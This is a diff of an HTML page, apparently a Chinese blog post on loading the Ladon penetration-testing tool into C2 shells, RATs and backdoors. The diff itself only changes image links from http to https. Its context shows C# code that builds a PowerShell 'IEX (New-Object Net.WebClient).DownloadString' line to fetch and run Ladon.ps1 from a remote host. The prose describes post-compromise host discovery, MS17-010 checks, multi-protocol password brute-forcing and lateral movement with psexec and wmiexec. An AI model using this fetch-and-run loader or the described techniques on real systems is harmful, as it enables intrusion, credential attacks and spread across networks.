@@ -217,9 +217,9 @@
     string LadonUrl = &quot;http://192.168.1.110:800/Ladon.ps1&quot;;
     string LadonCmd = &quot;powershell -nop -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&apos;&quot; + LadonUrl + &quot;&apos;); &quot; + input + &quot;\&quot;&quot;;
     _shell.ExecuteCommand(LadonCmd);
-}</code></pre><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/qscmd.PNG"></p>
+}</code></pre><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/qscmd.PNG"></p>
 <p>PS：任何shell、C2、RAT、后门不管你怎么称呼，但凡能执行命令的地方，都可用此方法加载Ladon强化自己的工具</p>
-<h3 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h3><p>机器上线后，在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等,更多功能请看Ladon文档。下图为探测C段存活主机，探测B段可使用ip/b参数，当然探测C段也可使用ip/c参数，不是非要/24.<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/QSLadon.PNG"></p>
+<h3 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h3><p>机器上线后，在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等,更多功能请看Ladon文档。下图为探测C段存活主机，探测B段可使用ip/b参数，当然探测C段也可使用ip/c参数，不是非要/24.<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/QSLadon.PNG"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>
 
     </div>
